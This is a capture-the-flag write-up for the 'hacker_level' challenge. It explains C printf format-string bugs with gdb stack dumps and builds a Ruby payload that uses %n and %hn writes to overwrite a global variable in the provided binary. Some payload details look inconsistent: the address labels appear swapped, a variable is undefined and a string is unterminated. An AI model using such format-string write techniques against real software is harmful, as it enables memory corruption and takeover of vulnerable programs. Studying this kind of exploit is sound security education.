# hacker_level

`hacker_level` asks you for your name, and tells you that you're not very
leet. Let's prove them wrong!

## Recon

The downloaded archive comes with both a Linux executable and a C source-code
file. The source file is immediately more interesting, becuase I don't have to
know x86 assembly or machine code, just C.

```c
    char name[64] = "";

    setbuf(stdin, NULL);		// turn off buffered I/O
    setbuf(stdout, NULL);

    printf("What's your name? ");
    fgets(name, sizeof name, stdin);

    calc_level(name);

    usleep(150000);
    printf("Hello, ");
    printf(name);

    usleep(700000);
    if (level == 0xCCC31337) {
```

Ignoring all the `usleep` calls that just troll us, we see that we read up to 64
bytes from stdin, put them in a cleared stack buffer, run them through a
`calc_level1` function, and compare the level against `0xCCC31337`.

```c
static void calc_level(const char *name) {
    for (const char *p = name; *p; p++) {
        level *= 257;
        level ^= *p;
    }
    level %= 0xcafe;
}
```

Further analysis of `calc_level` reveals that it cannot return a level larger
than 0xCAFE, which is less than 0xCCC31337. If you copied this file and edited
it to brute-force a name locally like I did, you can safely delete it :(

Fortunately, the `printf` call in `main` gives us more than enough control.

## Making `hacker_level` run locally

If you can make the given `hacker_level` binary work locally, skip this
section.

On the other hand, if you get a `No such file or directory` error, you're
probably trying to run a 32-bit binary on 64-bit Linux. Following some
[instructions from Stack Overflow][1], you can download what you need.

[1]: http://superuser.com/questions/344533/no-such-file-or-directory-error-in-bash-but-the-file-exists

These instructions worked for me on Ubuntu 15.04; it's pretty fast on the wired
network at #cccamp15 :)

```sh
# enable i386 architecture package downloads
sudo dpkg --add-architecture i386

# get i386 package lists
sudo apt-get update

# get some i386 packages
sudo apt-get install libc-i386 libc-dev-i386
```

## What is a printf exploit?

In C, `printf` takes one or more arguments. The first argument is a "format
string," that describes what the rest of the arguments should be. Some of the
formats are `%p` to output a `sizeof(void*)`-byte integer as pointer-style
(i.e. `0xcafed00d`), `%s` to output a null-terminated string, and `%n` to write
the number of characters `printf`-d so far into the `int*` argument.

That's really confusing!

```c
int chars_sent = 0;
printf("%p %s%n\n", 3202722474, "actually wasps", &chars_sent);
printf("%d\n", chars_sent);
```

This prints out:

```
0xbee5aaaa actually wasps
25
```

Additionally, you can also use different formats to output really long strings
from relatively short input strings.

This program prints out forty-five space characters, followed by the digit `7`:

```c
printf("%45d\n", 7);
```

You can learn more about `printf` with `man 3 printf`.

## Variable-length argument lists in C

It justs pops successive arguments off the stack!

### Non-shitty answer

```c
printf("%p %s%n\n", 3202722474, "actually wasps", &chars_sent);
```

In `gdb`:

```
(gdb) b printf
Breakpoint 1 at 0x8048330
(gdb) r
Starting program: /home/ubuntu/printf_demo

Breakpoint 1, 0xf7e4fa90 in printf () from /lib32/libc.so.6
(gdb) i reg
eax            0xffffd0a8	-12120
ecx            0xffffd0d0	-12080
edx            0xffffd0f4	-12044
ebx            0xf7fba000	-134504448
esp            0xffffd08c	0xffffd08c
ebp            0xffffd0b8	0xffffd0b8
esi            0x0	0
edi            0x8048370	134513520
eip            0xf7e4fa90	0xf7e4fa90 <printf>
eflags         0x292	[ AF SF IF ]
cs             0x23	35
ss             0x2b	43
ds             0x2b	43
es             0x2b	43
fs             0x0	0
gs             0x63	99
(gdb) x/16x $esp
0xffffd08c:	0x080484a6	0x0804856f	0xbee5aaaa	0x08048560
0xffffd09c:	0xffffd0a8	0x00000001	0xffffd164	0x00000000
0xffffd0ac:	0xd99ab800	0xf7fba41c	0xffffd0d0	0x00000000
0xffffd0bc:	0xf7e1e71e	0x00000000	0x08048370	0x00000000
```

That last dump of memory is relevant: doing some gdb detective work, we can
see that it includes:

1. `0x080484a6`: an instruction pointer to where we called printf from
2. `0x0804856f`: a pointer to the format string (the pointer ending with
`856f`),
3. `0xbee5aaaa`: our integer
4. `0xffffd0a8`: a pointer to `chars_sent`

Pretty cool, eh?

## More Recon

Let's see what's on the stack when we call `hacker_level`'s printf:

```
(gdb) b printf
Breakpoint 1 at 0x8048490
(gdb) r
Starting program: /home/ubuntu/hacker_level

Breakpoint 1, 0xf7e4fa90 in printf () from /lib32/libc.so.6
(gdb) c
Continuing.
What's your name? vito

Breakpoint 1, 0xf7e4fa90 in printf () from /lib32/libc.so.6
(gdb) c
Continuing.
Hello,
Breakpoint 1, 0xf7e4fa90 in printf () from /lib32/libc.so.6
(gdb) x/32x $esp
0xffffcfec:	0x08048611	0xffffd00c	0x00000040	0xf7fba600
0xffffcffc:	0xffffd078	0xffffd0c0	0xf7fe3570	0xffffd070
0xffffd00c:	0x6f746976	0x0000000a	0x00000000	0x00000000
0xffffd01c:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd02c:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd03c:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd04c:	0x00000000	0xf7ffdaf0	0xffffd070	0xf7ffd938
0xffffd05c:	0x08048333	0x00000000	0xffffd104	0x00000001
```

I grabbed more pointers this time around because I still haven't found what I'm
looking for.

1. `0x08048611`: `hacker_level.c:21`
2. `0xffffd00c`: the name I entered: `vito\n`
3. `0x00000040`: 64, probably an argument to fgets?
4. `0xf7fba600`: pointer to the FILE* stdin
5. `0xffffd078`: bottom of next stack frame
6. `0xffffd0c0`: top of next stack frame
7. `0xf7fe3570`: something in libc?
8. `0xffffd070`: top of the current stack frame?
9. `0x6f746976`: this is "vito" in ASCII, as referred to by #2 above

So: the pointer to our format string `vito\n` is the first argument to `printf`,
we have a half-dozen pointers we don't care about, and then we have stack space
we control.

We can use the first four bytes of our format string as a pointer, make sure we
output enough bytes to set it to the correct value, and then we should finally
be leet.

How many bytes is 0xCCC31337 anyways? It's 3,435,336,503 bytes, or most of a
DVD. So, this just got a bit harder: we have to do it in stages. We'll try to
output 0x00001337 directly on `level`, and then 0x0000CCC1 at `level + 2`.

Our format string now needs:

1. Address for `level`
2. Something to consume during step 7
3. Address for `level - 4`
4. Formats to consume six four-byte values from the stack
5. A format that pushes us up to 0x1337 bytes output
6. `%n` to write into `level`
7. A format that pushes us up to 0xCCC3 bytes output
8. `%n` to write into `level - 4`

## Hackin' & Drinkin'

This part is frustrating!

I didn't want to be reëncoding things over and over again, so I used `pry`, a
Ruby REPL/interpreter, to build strings.

My starting components were the two addresses, `level` and `level_2`. The
`level` address needs to target the 16 least-significant-bits of the `level` C
global, and `level_2` needs to target the 16 most-significant-bits.

From `gdb`, we find that `level` is at 0x0804a04c:

```
(gdb) p &level
$26 = (uint32_t *) 0x804a04c <level>
```

So we build these variables in pry:

```ruby
level   = "\x4e\xa0\x04\08"
level_2 = "\x4c\xa0\x04\08"
```

Next, after much frustration (shout out to bspar, duck, and the lulzsec crew for
emotional support!), I came up with these format string components to load
`0x1337` and `0xCCC1` into the two halves of the variable:

```ruby
fmt_1337 = "AAAA#{level_2}AAAA#{level}%p%p%p%p%p%#{leet - (4 + 62)}x%p"
fmt_ccc1 = "%#{0xccc1 - 0x1337 + 2}c"
```

In `fmt_1337`, the four "A"s take up space because debugging is hard, `level_2`
should be self-explanatory, the next four "A"s allow us to output a `%c` in
`fmt_ccc1`, and `level` gives us an address to write 0xccc1 to. The next five
`%p` elements consume some stack entries before we get to the current string.
The `leet - 66`-length hex output writes the first consumes one more stack
entry, and the last `%p` consumes the first four "A"s (again: debugging is hard,
especially when you've been drinking!).

`fmt_ccc1` is comparatively simpler: we make sure to eat up the right number of
bytes.

To build the final string, we write half-word size counts of characters
instead of full-words:

```ruby
fmt = fmt_1337 + "%hn" + fmt_ccc1 + "%hn
```

From this, we can write this to a file, and send it to the remote server, and
get the flag!
